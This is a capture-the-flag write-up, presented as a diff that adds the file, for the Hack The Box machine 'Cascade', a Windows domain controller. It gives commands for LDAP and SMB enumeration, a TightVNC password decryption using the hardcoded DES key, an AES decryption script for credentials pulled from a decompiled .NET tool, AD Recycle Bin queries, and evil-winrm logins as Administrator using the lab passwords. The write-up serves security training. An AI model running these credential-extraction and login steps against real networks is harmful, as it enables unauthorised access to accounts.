@@ -1,0 +1,332 @@
+Cascade
+
+   20th July 2020 / Document No D20.100.81
+   Prepared By: TRX
+   Machine Author: VbScrub
+   Difficulty: Medium
+   Classification: Confidential
+Synopsis
+
+Cascade is a medium difficulty Windows machine configured as a Domain Controller. LDAP
+anonymous binds are enabled, and enumeration yields the password for user r.thompson ,
+which gives access to a TightVNC registry backup. The backup is decrypted to gain the password
+for s.smith . This user has access to a .NET executable, which after decompilation and source
+code analysis reveals the password for the ArkSvc account. This account belongs to the AD
+Recycle Bin group, and is able to view deleted Active Directory objects. One of the deleted user
+accounts is found to contain a hardcoded password, which can be reused to login as the primary
+domain administrator.
+
+Skills Required
+
+      LDAP Enumeration
+      SMB Enumeration
+      Processing SQLite Databases
+      Reverse Engineering .NET Assemblies
+
+Skills Learned
+
+      TightVNC Password Extraction
+      AES Encryption
+      Active Directory Enumeration
+      Active Directory Recycle Bin
+Enumeration
+
+Let's start by running an Nmap scan.
+   ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.182 | grep ^[0-9] | cut -d '/'
+   -f 1 | tr '\n' ',' | sed s/,$//)
+   nmap -p$ports -Pn -sC -sV 10.10.10.182
+
+The scan reveals that LDAP (389), SMB (445) and WinRM (5985) are available. Let's enumerate
+SMB for any open shares.
+
+   smbclient -L 10.10.10.182
+
+Anonymous login is allowed but we're unable to list shares.
+
+Lightweight Directory Access Protocol (LDAP)
+
+Next, we can enumerate LDAP after downloading windapsearch.
+   git clone https://github.com/ropnop/windapsearch.git
+   pip install python-ldap
+   ./windapsearch.py -U --full --dc-ip 10.10.10.182
+The command above will list out all users in the domain.
+
+There don't seem to be any passwords in the user description fields, so we can start to examine
+some of the other user attributes. One of them for the user r.thompson is called
+cascadeLegacyPwd , which contains what seems to be a Base64 encoded string. Let's decode it.
+
+The output seems to be a password. From the windapsearch output we also know that the
+sAMAccountName is r.thompson , so this can be used as the username. Let's use Evil-WinRM to
+try to connect as r.thompson .
+
+   evil-winrm -i 10.10.10.182 -u r.thompson -p rY4n5eva
+
+The login failed, which means we don't have PowerShell Remoting permissions.
+
+SMB
+
+Let's use smbmap to verify if we have access to any of the SMB shares with the above credentials.
+   smbmap -H 10.10.10.182 -u r.thompson -p 'rY4n5eva'
+
+From the available shares the only non-default share that we have access to is the Data share.
+   smbclient \\\\10.10.10.182\\Data -U r.thompson
+
+The only folder we have access to is IT , which contains the four sub-folders Email Archives ,
+LogonAudit , Logs and Temp .
+
+The Email Archives folder contains Meeting_Notes_June_2018.html , which shows an email
+conversation between Steve Smith and the IT department. Download and open it.
+   cd "Email Archives"
+   get Meeting_Notes_June_2018.html
+
+A text editor or a browser can be used to view the file.
+
+   cat Meeting_Notes_June_2018.html
+
+   <SNIP>
+   We will be using a temporary account to perform all tasks related to the network
+   migration and this account will be deleted at the end of 2018 once the migration
+   is complete. This will allow us to identify actions related to the migration in
+   security logs etc. Username is TempAdmin (password is the same as the normal
+   admin account password).
+   </SNIP>
+
+The email exchange hints to the existence of a TempAdmin account, that has the same password
+as the default Administrator account.
+The Logs folder contains the Ark AD Recycle Bin and DCs folders, which in turn contain
+ArkAdRecycleBin.log and dcdiag.log respectively.
+
+Let's download and proceed to inspect these files.
+ArkAdRecycleBin.log contains the text logs for a program called ARK AD RECYCLE BIN
+MANAGER .
+
+   8/12/2018 12:22 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2
+   **
+   8/12/2018 12:22 [MAIN_THREAD] Validating settings...
+   8/12/2018 12:22 [MAIN_THREAD] Running as user CASCADE\ArkSvc
+   8/12/2018 12:22 [MAIN_THREAD] Moving object to AD recycle bin
+   CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
+   8/12/2018 12:22 [MAIN_THREAD] Successfully moved object. New location
+   CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted
+   Objects,DC=cascade,DC=local
+
+The log informs us that the program is running in the context of ArkSvc and that the TempAdmin
+account has been moved to the recycle bin.
+
+Finally, Temp contains folders for the users r.thompson and s.smith . The file VNC
+Install.reg can be found inside s.smith 's folder. It seems to be a backup of the registry
+settings for TightVNC , a desktop remote control program.
+Foothold
+
+TightVNC
+
+The registry file found contains a Password attribute, with the corresponding value consisting of
+hexadecimal characters.
+
+   "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+This writeup demonstrates how TightVNC passwords can be decrypted using Metasploit. Use the
+commands below to decrypt the password.
+
+   msfconsole
+   msf5 > irb
+   key="\x17\x52\x6b\x06\x23\x4e\x58\x07"
+   require 'rex/proto/rfb'
+   Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), key
+The key variable is the known hardcoded DES key that has been extracted from the program.
+The Rex::Proto::RFB::Cipher.decrypt function is used to decrypt the password with the
+provided key.
+
+The password for s.smith is revealed as sT333ve2 . Let's check if this user belongs to the
+Remote Management Users group, as this would allow us to connect using Evil-WinRM .
+
+   ./windapsearch.py -U --full --dc-ip 10.10.10.182
+This is the case and we can proceed to connect.
+   evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2
+
+This works and a PowerShell Remoting connection is established. The user flag is located in
+C:\Users\s.smith\Desktop .
+Lateral Movement
+
+Audit
+
+The Get-ADUser cmdlet can be used to list the properties for the user s.smith .
+   Get-ADUser -identity s.smith -properties *
+
+The command reveals that the user is a member of the Audit Share group, and also that the
+logon script MapAuditDrive.vbs is assigned to this account. Active Directory logon scripts are
+saved in the NETLOGON share by default.
+
+   smbclient \\\\10.10.10.182\\NETLOGON -U s.smith
+
+The share is accessible and the script is present along with another script called
+MapDataDrive.vbs . Let's download and read them.
+   get MapAuditDrive.vbs
+   get MapDataDrive.vbs
+The MapDataDrive.vbs script mounts the Data drive that we previously accessed as
+r.thompson , while the MapAuditDrive.vbs script maps a previously inaccessible drive called
+Audit$ .
+   'MapAuditDrive.vbs
+   Option Explicit
+   Dim oNetwork, strDriveLetter, strRemotePath
+   strDriveLetter = "F:"
+   strRemotePath = "\\CASC-DC1\Audit$"
+   Set oNetwork = CreateObject("WScript.Network")
+   oNetwork.MapNetworkDrive strDriveLetter, strRemotePath
+   WScript.Quit
+Let's inspect the drive using smbclient as the user s.smith .
+   smbclient \\\\10.10.10.182\\Audit$ -U s.smith
+
+SQLite
+
+Let's download RunAudit.bat for further examination.
+   CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
+
+The batch file executes CascAudit.exe with a database file located in the DB folder passed as
+input. Download the database and use the file command to check the file type.
+It is identified as a SQLite database. The sqlitebrowser utility can be used to inspect the DB
+contents.
+
+   sqlitebrowser Audit.db
+
+The table LDAP contains a password for the ArkSvc user. It seems to be base64 encoded, but
+decoding it does not return any useful output, which indicates that the data is encrypted.
+
+CascAudit
+
+Since this database is used by the CascAudit.exe executable let's download and attempt to
+decompile it. This may help us to understand how the password was encrypted. The file
+command can be used to identify the type of executable.
+
+It's identified as a .NET executable, so we can use a .NET decompiler such as dnSpy to open it. It
+can be run on Linux using wine. Download the latest 64-bit release from the official GitHub repo.
+
+   sudo apt install wine64 -y
+   cd ~/Downloads
+   unzip dnSpy-netcore-win64.zip
+   cd dnSpy-netcore-win64
+   wine dnSpy.exe
+Click on File , then Open and locate CascAudit.exe to decompile it. Locate the main function
+by clicking on CascAudit (1.0.0.0) , then CascAudit and selecting MainModule .
+
+The relevant code that decrypts the password is shown below.
+
+   string text = string.Empty;
+   string password = string.Empty;
+   string text2 = string.Empty;
+   try
+   {
+
+       sqliteConnection.Open();
+       using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP",
+   sqliteConnection))
+       {
+
+          using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
+          {
+
+              sqliteDataReader.Read();
+              text = Conversions.ToString(sqliteDataReader["Uname"]);
+              text2 = Conversions.ToString(sqliteDataReader["Domain"]);
+              string text3 = Conversions.ToString(sqliteDataReader["Pwd"]);
+              try
+              {
+
+                 password = Crypto.DecryptString(text3, "c4scadek3y654321");
+              }
+              catch (Exception ex)
+              {
+                 Console.WriteLine("Error decrypting password: " + ex.Message);
+                 return;
+
+              }
+          }
+       }
+       sqliteConnection.Close();
+   }
+
+The program opens the SQLite database, reads the password and decrypts it with the
+Crypto.DecryptString function, using the key c4scadek3y654321 . The decrypt function does
+not seem to exist in the executable, so it might be loaded through a DLL. Looking at the Audit
+share, CascCrypto.dll is identified. Download it from the share and open it using dnSpy . The
+relevant code is as follows.
+
+   public static string DecryptString(string EncryptedString, string Key)
+                 {
+                         byte[] array = Convert.FromBase64String(EncryptedString);
+                         Aes aes = Aes.Create();
+                         aes.KeySize = 128;
+                         aes.BlockSize = 128;
+                         aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
+                         aes.Mode = 1;
+                         aes.Key = Encoding.UTF8.GetBytes(Key);
+                         string @string;
+                         using (MemoryStream memoryStream = new MemoryStream(array))
+                         {
+                                using (CryptoStream cryptoStream = new
+
+   CryptoStream(memoryStream, aes.CreateDecryptor(), 0))
+                                {
+                                       byte[] array2 = new byte[checked(array.Length - 1 + 1)];
+                                       cryptoStream.Read(array2, 0, array2.Length);
+                                       @string = Encoding.UTF8.GetString(array2);
+                                }
+
+                         }
+                         return @string;
+                 }
+
+A 128-bit AES algorithm is used to decrypt the password. The encryption mode is set to 1 and
+the IV is set to 1tdyjCbY1Ix49842 . According to the .NET documentation, mode 1 corresponds to
+CBC. The pyaes module can be used to decrypt the password.
+
+The following script can be used to decrypt the password.
+   import pyaes
+   from base64 import b64decode
+   key = b"c4scadek3y654321"
+   iv = b"1tdyjCbY1Ix49842"
+   aes = pyaes.AESModeOfOperationCBC(key, iv = iv)
+   decrypted = aes.decrypt(b64decode('BQO5l5Kj9MdErXx6Q6AGOw=='))
+   print(decrypted.decode())
+
+The decryption is successful, revealing the password for the ArcSvc account to be
+w3lc0meFr31nd . We confirm that ArkSvc is in the Remote Management Users group.
+
+Use Evil-WinRM as before to connect to the system.
+   evil-winrm -i 10.10.10.182 -u ArkSvc -p w3lc0meFr31nd
+
+A PowerShell Remoting session as ArkSvc is established, but the root flag is not available.
+Privilege Escalation
+
+Let's enumerate the group membership of our current user.
+   whoami /all
+
+The user is identified to belong to the AD Recycle Bin group. The Active Directory Recycle Bin is
+used to recover deleted Active Directory objects such as Users, Groups, OUs etc. The objects keep
+all their properties intact while in the AD Recycle Bin, which allows them to be restored at any
+point. Let's enumerate the AD Recycle Bin for interesting objects using the Get-ADObject
+command, and filtering only deleted objects with the isDeleted property.
+
+   Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects
+A filter can be applied to retrieve user accounts only, using the objectclass property.
+
+   Get-ADObject -ldapfilter "(&(objectclass=user)(isDeleted=TRUE))" -
+   IncludeDeletedObjects
+
+The TempAdmin account that was mentioned in the email correspondence is returned. Let's
+further enumerate this user and list the available properties. The DisplayName filter is used to
+select only that specific account.
+   Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin)
+   (isDeleted=TRUE))" -IncludeDeletedObjects -Properties *
+
+A property called cascadelegacyPwd is returned, which looks very similar to the one that
+r.thompson had, and also looks as a Base64 encoded string. Let's decode it.
+
+The returned string looks like a password but the user is deleted, so we cannot use it to log in as
+TempAdmin . However, we recall the email correspondence mentioned that the Administrator
+account has the same password as the TempAdmin account. Let's login as the Administrator
+instead.
+
+   evil-winrm -i 10.10.10.182 -u Administrator -p baCT3r1aN00dles
+
+The login was successful and the root flag can be read.
+
